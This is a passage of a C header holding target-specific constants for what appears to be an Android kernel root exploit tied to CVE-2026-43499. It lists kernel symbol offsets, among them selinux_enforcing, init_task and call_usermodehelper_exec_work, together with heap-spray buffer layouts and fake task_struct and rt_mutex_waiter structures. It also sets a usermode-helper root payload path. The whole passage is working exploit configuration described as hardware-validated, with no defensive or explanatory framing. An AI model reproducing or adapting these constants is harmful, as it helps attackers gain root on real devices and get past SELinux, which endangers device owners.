#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x02a90800ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* nfulnl_logger's first qword dereferences to "nfnetlink_log" (verified). */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01d5dbe6ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a91e48ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
/* random_table[4] is "boot_id"; entry 0x02bba9c0 + offsetof(ctl_table,data)
 * 0x8. Its .data slot holds sysctl_bootid -- cross-check passed. Note
 * sysctl_bootid is genuinely odd-aligned here (char array in a struct). */
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02bba9c8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02e6c0b1ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Spray-buffer layout constants -- payload-side, not firmware-derived. */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200
#define SCRATCH_OFF 0x3000

#if defined(APP_PAYLOAD) && APP_PAYLOAD
/* Dedicated compact layout for rewriting the verified P0 page.  The normal
 * fresh-page fallback keeps the hardware-validated offsets above. */
#define APP_REUSED_FOPS_PAGE_SOURCE_OFF 0x0e80
#define APP_REUSED_FOPS_PAGE_PRESERVE 0x0100
#define APP_REUSED_FOPS_FOPS_OFF 0x1000
#define APP_REUSED_FOPS_RIGHT_OFF 0x1140
#define APP_REUSED_FOPS_LEFT_OFF 0x1180
#define APP_REUSED_FOPS_LOCK_OFF 0x1210
#define APP_REUSED_FOPS_WAITER_OFF 0x1350
#define APP_REUSED_FOPS_TASK_OFF 0x1480
#define APP_REUSED_FOPS_SCRATCH_OFF 0x1d80
#endif

/* struct rt_mutex_waiter (BTF, size 0x58) -- COMPACT layout.
 * FAKE_WAITER_LAYOUT_SIZE derives to ww_ctx + 8 == 0x58, matching BTF. */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

/* struct task_struct (BTF, size 0x1200). */
#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_TASK_GROUP_OFF 0x400
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* pool_workqueue matches the 6.6 targets; worker_pool matches the 5.10 one. */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* 5.15 predates struct slab (added in 5.17): slab_cache lives in struct page
 * at 0x18, as on the 5.10 target. */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* struct file_operations size 0x120 on 5.15 -- member offsets differ from
 * both the 6.6 (0x108) and 6.1 (0x110) targets. */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
